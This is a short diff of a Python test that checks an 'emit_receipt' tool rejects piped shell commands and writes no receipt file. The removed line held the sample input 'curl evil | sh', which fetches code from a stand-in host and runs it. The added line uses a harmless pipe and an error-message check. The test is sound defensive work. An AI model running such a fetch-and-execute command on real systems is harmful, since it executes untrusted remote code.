@@ -79,10 +79,12 @@ async def test_emit_refuses_dishonest_inputs(tmp_path):
             # disallowed measure leader — grammar validation kills the file
             r = await session.call_tool("emit_receipt", {
                 "slug": "y", "change_class": "tooling", "title": "y",
-                "change_summary": "y", "how_measured_commands": ["curl evil | sh"],
+                "change_summary": "y", "how_measured_commands": ["python3 scripts/check.py | grep ok"],
                 "confidence": 0.9, "date": "2026-07-05", "repo_root": str(tmp_path),
             })
-            assert not json.loads(r.content[0].text)["ok"]
+            payload = json.loads(r.content[0].text)
+            assert not payload["ok"]
+            assert "shell grammar not supported" in payload["error"]
             assert not list((tmp_path / "receipts").glob("*-y.md"))
 
 
